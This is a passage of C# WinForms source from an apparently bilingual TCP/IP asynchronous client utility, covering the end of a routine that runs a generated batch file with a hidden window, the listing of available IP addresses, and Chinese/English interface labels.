                        //PC.FileSystem.WriteAllText(SecretBATFile, TempCommand, false, System.Text.Encoding.ASCII) //System.Text.Encoding.GetEncoding(936))

                        //保存的中文不会乱码，但是在DOS环境下会乱码
                        PC.FileSystem.WriteAllText(SecretBATFile, TempCommand, false);

                        //4、执行BAT命令
                        Interaction.Shell(SecretBATFile, Microsoft.VisualBasic.AppWinStyle.Hide);

                        }

                    }
                catch (Exception ex) 
                    {
                    AddText(ex.Message);
                    }
                
                
                }            
            
            }

        /// <summary>
        /// 添加所有可用的IP地址到控件ListView
        /// </summary>
        private void AddAvailableIPAddressToList() 
            {

            try
                {

                IPAddressList = FC.SearchAvailableIPAddresses();
                
                ClientListView1.BeginUpdate();
                ClientListView1.View = System.Windows.Forms.View.Details;
                ClientListView1.Items.Clear();
                ClientListView1.Columns[0].TextAlign = HorizontalAlignment.Center;
                ClientListView1.Columns[1].TextAlign = HorizontalAlignment.Center;
                ClientListView1.Columns[2].TextAlign = HorizontalAlignment.Center;
                ClientListView1.Columns[3].TextAlign = HorizontalAlignment.Center;
                ClientListView1.Columns[4].TextAlign = HorizontalAlignment.Center;

                //如果没有联网，则将本地127.0.0.1添加至列表；
                //否则添加所有可以联网的IP地址至列表

                if (IPAddressList == null)
                    {
                    lblIPNumber.Text = "0";

                    ListViewItem AddNewItems = new ListViewItem();
                    AddNewItems.SubItems.Add("127.0.0.1");
                    AddNewItems.SubItems.Add("8000");
                    AddNewItems.SubItems.Add("False");
                    AddNewItems.SubItems.Add("CRLF");
                    ClientListView1.Items.Add(AddNewItems);
                    ClientListView1.EndUpdate();

                    txtTargetServerIPAddress.Text = "127.0.0.1";
                    txtTargetServerPort.Text = "8000";

                    FeedBackClientParameters = new SaveClientParameters[1];

                    FeedBackClientParameters[0].TargetServerIPAddress = "127.0.0.1";
                    FeedBackClientParameters[0].TargetServerPort = 8000;
                    FeedBackClientParameters[0].Tested = false;
                    FeedBackClientParameters[0].EndingSetting = Endings.CRLF;                                        
                    return;
                    }

                if (IPAddressList.Length > 1)
                    {
                    lblIPNumber.Text = IPAddressList.Length.ToString();

                    //根据实际获取的可用IP地址重定义客户端返回的参数列表
                    FeedBackClientParameters = new SaveClientParameters[IPAddressList.Length];

                    for (int a = 0; a < IPAddressList.Length; a++)
                        {
                        ListViewItem AddNewItems = new ListViewItem();
                        AddNewItems.SubItems.Add(IPAddressList[a]);
                        AddNewItems.SubItems.Add("800" + a.ToString());
                        AddNewItems.SubItems.Add("False");
                        AddNewItems.SubItems.Add("CRLF");
                        ClientListView1.Items.Add(AddNewItems);

                        FeedBackClientParameters[a].TargetServerIPAddress = IPAddressList[a];
                        FeedBackClientParameters[a].TargetServerPort = 0;
                        FeedBackClientParameters[a].Tested = false;
                        FeedBackClientParameters[a].EndingSetting = Endings.CRLF;
                        }

                    ClientListView1.EndUpdate();

                    txtTargetServerIPAddress.Text = IPAddressList[0];
                    txtTargetServerPort.Text = "8000";

                    }

                }
            catch (Exception ex) 
                {
                AddText(ex.Message);
                }
            
            }

        /// <summary>
        /// 用于设置界面的语言
        /// </summary>
        private void LanguageForUserInterface() 
            {

            if (ChineseLanguage == true)
                {
                this.Text = "以太网异步客户端通讯软件";
                SavePara_ToolStripMenuItem.Text = "保存参数";
                Client_GroupBox1.Text = "异步客户端";
                
                lblTargetServerIPAddress.Text = "服务器IP地址:";
                lblTargetServerPort.Text = "服务器端口:";
                
                btnConnectToServer.Text = "连接";
                btnClientSendToServer.Text = "发送";
                btnCloseClient.Text = "关闭";
                
                lblEndingForClientSendingMessage.Text = "结束符:";
                
                ShutDownServer_ToolStripMenuItem.Text = "屏蔽服务器";
                ShutDownClient_ToolStripMenuItem.Text = "屏蔽客户端";
                Setting_ToolStripMenuItem.Text = "设置";
                
                ClientListView1.Columns[1].Text = "服务器IP地址";
                ClientListView1.Columns[2].Text = "端口";
                ClientListView1.Columns[3].Text = "已测试";

                RefreshToolStripMenuItem.Text = "刷新网络";
                btnAddPortForClient.Text = "添加";
                
                ClientListView1.Columns[4].Text = "结束符";
                
                btnDelClientRecordInListView.Text = "删除";
                
                lblIPCount.Text = "IP个数:";
                
                btnReviseClientRecord.Text = "修改";
                
                LanguageToolStripMenuItem.Text = "语言";
            
                AboutToolStripMenuItem.Text = "关于";
                
                chkClientSendHEX.Text = "16进制";
                
                lblIPAddressSection.Text = "IP地址段:";
                btnSearchIP.Text = "搜索IP";
                
                SearchPCName_ToolStripMenuItem1.Text = "计算机"; //搜索计算机名称
                
                MACToolStripMenuItem.Text = "物理地址";
                NetworkStatus_Menu.Text = "网络状态";

                if(StartMultiConnect==true)
                    {
                    btnMultiConnect.Text = "关多端口连接";
                    }
                else
                    {
                    btnMultiConnect.Text = "开多端口连接";
                    }

                lblAutoSendInterval.Text = "自动发送间隔:";
                lblMS.Text = "毫秒";
                chkAutoSend.Text = "自动发送";
                chkSendFile.Text = "发送文件";

                }
            else 
                {
                lblAutoSendInterval.Text = "Auto Send Interval:";
                lblMS.Text = "ms";
                chkAutoSend.Text = "Auto Send";
                chkSendFile.Text = "Send File";

                if (StartMultiConnect == true)
                    {
                    btnMultiConnect.Text = "Close Multi";
                    }
                else
                    {
                    btnMultiConnect.Text = "Multi Connect";
                    }

                NetworkStatus_Menu.Text = "Network";
                MACToolStripMenuItem.Text = "MAC";
                
                SearchPCName_ToolStripMenuItem1.Text = "PC Name";
                
                btnSearchIP.Text = "Search IP";
                lblIPAddressSection.Text = "IP Address Section:";
                
                chkClientSendHEX.Text = "HEX";
                
                AboutToolStripMenuItem.Text = "About";
                
                LanguageToolStripMenuItem.Text = "Language";
                
                btnReviseClientRecord.Text = "Revise";
                
                lblIPCount.Text = "IP Count:";
                
                btnDelClientRecordInListView.Text = "Del";
                
                btnAddPortForClient.Text = "Add";
                
                RefreshToolStripMenuItem.Text = "Refresh IP";

                this.Text = "TCP/IP Async Client Communication Software";
                SavePara_ToolStripMenuItem.Text = "Save Para";
                Client_GroupBox1.Text = "Be Async Client";
                
                lblTargetServerIPAddress.Text = "Server IP Address:";
                lblTargetServerPort.Text = "Server Port:";
                
                btnConnectToServer.Text = "Connect";
                btnClientSendToServer.Text = "Send";
                btnCloseClient.Text = "Close";
                
                lblEndingForClientSendingMessage.Text = "Ending:";
                
                ShutDownServer_ToolStripMenuItem.Text = "ShutDown Server";
                ShutDownClient_ToolStripMenuItem.Text = "ShutDown Client";
                Setting_ToolStripMenuItem.Text = "Setting";
                
                ClientListView1.Columns[1].Text = "Server IP Address";
                ClientListView1.Columns[2].Text = "Port";
                ClientListView1.Columns[3].Text = "Tested";
                ClientListView1.Columns[4].Text = "Ending";
                }

            }

        private void SearchIPAddressForCertainSegment() 
            {

            try
                {



                }
            catch (Exception ex)
                {
                MessageBox.Show("" + ex.Message);
                }
            
            }

        #endregion
        
        }//class

    }//namespace